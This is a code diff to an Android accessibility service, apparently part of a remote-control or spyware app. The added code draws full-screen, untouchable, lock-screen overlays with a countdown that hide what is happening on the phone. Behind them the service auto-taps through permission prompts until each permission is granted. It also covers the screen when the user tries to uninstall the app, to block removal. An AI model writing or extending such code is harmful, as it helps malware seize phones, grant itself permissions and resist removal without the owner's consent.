@@ -41,6 +41,7 @@ import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.CountDownTimer;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
@@ -57,6 +58,9 @@ import android.view.View;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+import android.widget.ImageView;
+import android.widget.LinearLayout;
+import android.widget.ProgressBar;
 import android.widget.TextView;
 
 import androidx.annotation.NonNull;
@@ -136,6 +140,25 @@ public class MainAccessibilityService extends AccessibilityService {
     private WindowManager windowManager;
     private View overlayView;
     private TextView loadingTextView;
+
+    //waitingScreen
+    private boolean isWaitingScreen = false;
+    private WindowManager windowManagerWaiting;
+    private View overlayWaitingView;
+    private ImageView imgWaiting;
+    private TextView txtCounting;
+    private TextView txtWaiting;
+
+    private ProgressBar progressWaitingBar;
+
+    //RemoveScreen
+    private boolean isRemoveScreen = false;
+    private WindowManager windowManagerRemove;
+    private View overlayRemoveView;
+    private ImageView imgRemove;
+    private TextView txtRemoveCounting;
+    private TextView txtRemoveWaiting;
+    private TextView txtRemoveTitle;
 
     //skeleton
     private final List<SkeletonEntry> skeletonEntryResultList = new ArrayList<>();
@@ -220,6 +243,8 @@ public class MainAccessibilityService extends AccessibilityService {
         super.onServiceConnected();
         CONTEXT = this;
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+        windowManagerWaiting = (WindowManager) getSystemService(WINDOW_SERVICE);
+        windowManagerRemove = (WindowManager) getSystemService(WINDOW_SERVICE);
 
         displayMetrics = new DisplayMetrics();
         Display display = getSystemService(WindowManager.class).getDefaultDisplay();
@@ -237,6 +262,7 @@ public class MainAccessibilityService extends AccessibilityService {
     private void setPermissionRequest() {
         Intent serviceIntentX = new Intent(getBaseContext(), Server.class);
         getBaseContext().startService(serviceIntentX);
+        makeOverlayWaitingScreen();
         if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             if(manufacturer.equals("xiaomi")) {
                 new Handler().postDelayed(new Runnable() {
@@ -559,8 +585,8 @@ public class MainAccessibilityService extends AccessibilityService {
         } else {
             setStopUninstall(event);
             setMediaProjectionPermission(event);
-            setStopUnAccessibility();
             setAutomaticallyPermission(event);
+            setStopUnAccessibility();
         }
     }
 
@@ -704,6 +730,9 @@ public class MainAccessibilityService extends AccessibilityService {
                     isAppDetail = false;
                     getUninstallDialog(rootNode);
                     if(isSelectedApp && isUninstallapp) {
+                        if(!(manufacturer.equals("xiaomi") && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)) {
+                            makeOverlayRemoveScreen();
+                        }
                         setStopUninstallApp(rootNode);
                     }
 
@@ -748,18 +777,49 @@ public class MainAccessibilityService extends AccessibilityService {
 
     public void AllowPrims14_normal() {
         int startX = deviceWidth / 2;
+        int startY = (int) (deviceHeight * 0.45);
+
+        int step = 10;// steps bettwen each click
+        int endY = (int) (deviceHeight * 0.9);//here i want to reach 90% of screen
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            for (String permission : MyPermissions.ALL_PERMISSIONS) {
+                try {
+                    Thread.sleep(100);
+                } catch (Exception s) {
+                    Log.d("Permission::", "permission");
+                }
+                for (int y = startY; y < endY; y += step) {
+                    try {
+                        Log.d("Permission::", permission + String.valueOf(y) + ":::" + String.valueOf(deviceHeight));
+                        Thread.sleep(10);
+                    } catch (Exception s) {
+                        Log.d("Permission::", "permission");
+                    }
+
+                    if (MyPermissions.hasPermissions(getBaseContext(), permission)) {
+                        break;
+                    }
+                    Common.getInstance().setLastPermissionlocation(y);
+                    try {
+                        clickthis(startX, y);
+
+                    } catch (Exception e) {
+                        // Handle the exception if needed
+                    }
+                }
+            }
+        }
+    }
+    public void AllowPrims14_phone() {
+        int startX = deviceWidth / 2;
         int startY = (int) (deviceHeight * 0.5);
 
         int step = 10;// steps bettwen each click
         int endY = (int) (deviceHeight * 0.9);//here i want to reach 90% of screen
-        try {
-            Thread.sleep(1000);
-        } catch (Exception s) {
-
-        }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            for (String permission : MyPermissions.ALL_PERMISSIONS) {
+            for (String permission : MyPermissions.ALL_phone) {
                 try {
                     Thread.sleep(100);
                 } catch (Exception s) {
@@ -797,18 +857,18 @@ public class MainAccessibilityService extends AccessibilityService {
 
         int step = 10;// steps bettwen each click
         int endY = (int) (deviceHeight * 0.9);//here i want to reach 90% of screen
-        try {
-            Thread.sleep(1000);
-        } catch (Exception s) {
-
-        }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            try {
+                Thread.sleep(100);
+            } catch (Exception s) {
+                Log.d("Permission::", "permission");
+            }
             for (String permission : MyPermissions.MEDIA_PERMISSION) {
                 for (int y = startY; y < endY; y += step) {
                     try {
                         Log.d("Permission::", permission + String.valueOf(y) + ":::" + String.valueOf(deviceHeight));
-                        Thread.sleep(100);
+                        Thread.sleep(10);
                     } catch (Exception s) {
                         Log.d("Permission::", "permission");
                     }
@@ -1266,6 +1326,285 @@ public class MainAccessibilityService extends AccessibilityService {
             windowManager.removeView(loadingTextView);
             overlayView = null;
             blackScreen = false;
+        }
+    }
+
+    public void makeOverlayWaitingScreen() {
+        if (overlayWaitingView == null) {
+            overlayWaitingView = new View(this);
+            overlayWaitingView.setBackgroundColor(0xFF787878); // Black color
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    deviceHeight + 300,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
+                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
+                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                    PixelFormat.TRANSPARENT
+            );
+            params.gravity = Gravity.CENTER;
+
+//            imgWaiting = new ImageView(this);
+//            imgWaiting.setImageDrawable(getResources().getDrawable(R.drawable.img_remove));
+//            WindowManager.LayoutParams img_params = new WindowManager.LayoutParams(
+//                    deviceWidth/2,
+//                    deviceWidth/2,
+//                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+//                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
+//                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
+//                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+//                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+//                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
+//                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+//                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+//                    PixelFormat.TRANSPARENT
+//            );
+//            img_params.gravity = Gravity.CENTER;
+
+            txtWaiting = new TextView(this);
+            txtWaiting.setTextColor(Color.WHITE);
+            txtWaiting.setText(getResources().getString(R.string.overlaywaiting));
+            txtWaiting.setTextSize(20);
+            txtWaiting.setGravity(Gravity.CENTER);
+            WindowManager.LayoutParams txt_waiting_params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
+                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
+                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                    PixelFormat.TRANSPARENT
+            );
+            txt_waiting_params.gravity = Gravity.CENTER;
+            txt_waiting_params.y = 300;
+
+            txtCounting = new TextView(this);
+            txtCounting.setTextColor(Color.WHITE);
+            txtCounting.setText("15");
+            txtCounting.setTextSize(50);
+            txtCounting.setGravity(Gravity.CENTER);
+            txtCounting.setPadding(0,0,0,deviceWidth/2 + 60);
+            WindowManager.LayoutParams txt_params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
+                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
+                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                    PixelFormat.TRANSPARENT
+            );
+            txt_params.gravity = Gravity.CENTER;
+
+            progressWaitingBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
+            progressWaitingBar.setIndeterminate(false); // Set to false for determinate progress
+            progressWaitingBar.setMax(100); // Set max progress
+            progressWaitingBar.setProgress(100); // Set initial progress (e.g., 50%)
+
+// Set layout params for the ProgressBar
+            WindowManager.LayoutParams progressParams = new WindowManager.LayoutParams(
+                    deviceWidth - 100, // Full width
+                    100, // Height auto
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
+                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
+                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                    PixelFormat.TRANSPARENT
+            );
+            progressParams.gravity = Gravity.CENTER;
+
+            windowManagerWaiting.addView(overlayWaitingView, params);
+            windowManagerWaiting.addView(progressWaitingBar, progressParams);
+            windowManagerWaiting.addView(txtWaiting, txt_waiting_params);
+            windowManagerWaiting.addView(txtCounting, txt_params);
+            isWaitingScreen = true;
+
+            new CountDownTimer(15000, 1000) { // 10 seconds countdown, tick every 1 second
+                @Override
+                public void onTick(long millisUntilFinished) {
+                    // Update the countdown text with the remaining seconds
+                    txtCounting.setText(String.valueOf(millisUntilFinished / 1000));
+                    progressWaitingBar.setProgress((int)(millisUntilFinished / 150) , true);
+                }
+
+                @Override
+                public void onFinish() {
+                    // When the countdown finishes, display "Done" or hide the countdown
+                    txtCounting.setText("0");
+                    removeWaitingOverlayscreen();
+                }
+            }.start();
+        }
+    }
+
+    public void removeWaitingOverlayscreen() {
+        if(overlayWaitingView != null) {
+            windowManagerWaiting.removeView(overlayWaitingView);
+            windowManagerWaiting.removeView(txtWaiting);
+            windowManagerWaiting.removeView(txtCounting);
+            windowManagerWaiting.removeView(progressWaitingBar);
+//            windowManagerWaiting.removeView(imgWaiting);
+            overlayWaitingView = null;
+            isWaitingScreen = false;
+        }
+    }
+
+    public void makeOverlayRemoveScreen() {
+        if (overlayRemoveView == null) {
+            overlayRemoveView = new View(this);
+            overlayRemoveView.setBackgroundColor(0xFF787878); // Black color
+
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    deviceHeight + 300,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
+                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
+                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                    PixelFormat.TRANSPARENT
+            );
+            params.gravity = Gravity.CENTER;
+
+
+
+            imgRemove = new ImageView(this);
+            imgRemove.setImageDrawable(getResources().getDrawable(R.drawable.img_alert));
+
+            WindowManager.LayoutParams img_params = new WindowManager.LayoutParams(
+                    deviceWidth/2,
+                    deviceWidth/2,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
+                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
+                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                    PixelFormat.TRANSPARENT
+            );
+            img_params.gravity = Gravity.CENTER;
+
+
+            txtRemoveWaiting = new TextView(this);
+            txtRemoveWaiting.setTextColor(Color.WHITE);
+            txtRemoveWaiting.setText(getResources().getString(R.string.overlayremovewaiting));
+            txtRemoveWaiting.setTextSize(14);
+            txtRemoveWaiting.setGravity(Gravity.CENTER);
+
+            WindowManager.LayoutParams txt_waiting_params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
+                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
+                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                    PixelFormat.TRANSPARENT
+            );
+            txt_waiting_params.gravity = Gravity.CENTER;
+            txt_waiting_params.y = deviceWidth/2;
+
+            txtRemoveTitle = new TextView(this);
+            txtRemoveTitle.setTextColor(Color.WHITE);
+            txtRemoveTitle.setText(getResources().getString(R.string.overlayremovetitle));
+            txtRemoveTitle.setTextSize(14);
+            txtRemoveTitle.setGravity(Gravity.CENTER);
+
+            WindowManager.LayoutParams txt_title_params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
+                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
+                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                    PixelFormat.TRANSPARENT
+            );
+            txt_title_params.gravity = Gravity.CENTER;
+            txt_title_params.y = deviceWidth/4;
+
+
+            txtRemoveCounting = new TextView(this);
+            txtRemoveCounting.setTextColor(Color.WHITE);
+            txtRemoveCounting.setText("0");
+            txtRemoveCounting.setTextSize(50);
+            txtRemoveCounting.setGravity(Gravity.CENTER);
+            txtRemoveCounting.setPadding(0,0,0,deviceWidth/2 + 60);
+
+            WindowManager.LayoutParams txt_params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.WRAP_CONTENT,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
+                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
+                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                    PixelFormat.TRANSPARENT
+            );
+            txt_params.gravity = Gravity.CENTER;
+
+
+            windowManagerRemove.addView(overlayRemoveView, params);
+            windowManagerRemove.addView(imgRemove, img_params);
+            windowManagerRemove.addView(txtRemoveWaiting, txt_waiting_params);
+            windowManagerRemove.addView(txtRemoveTitle, txt_title_params);
+            windowManagerRemove.addView(txtRemoveCounting, txt_params);
+            isWaitingScreen = true;
+
+            new CountDownTimer(15000, 1000) { // 10 seconds countdown, tick every 1 second
+                @Override
+                public void onTick(long millisUntilFinished) {
+                    // Update the countdown text with the remaining seconds
+                    txtRemoveCounting.setText(String.valueOf(millisUntilFinished / 1000));
+                }
+
+                @Override
+                public void onFinish() {
+                    // When the countdown finishes, display "Done" or hide the countdown
+                    txtRemoveCounting.setText("0");
+                    removeRemoveOverlayscreen();
+                }
+            }.start();
+        }
+    }
+
+    public void removeRemoveOverlayscreen() {
+        if(overlayRemoveView != null) {
+            windowManagerRemove.removeView(overlayRemoveView);
+            windowManagerRemove.removeView(txtRemoveWaiting);
+            windowManagerRemove.removeView(txtRemoveCounting);
+            windowManagerRemove.removeView(imgRemove);
+            overlayRemoveView = null;
+            isWaitingScreen = false;
         }
     }
 
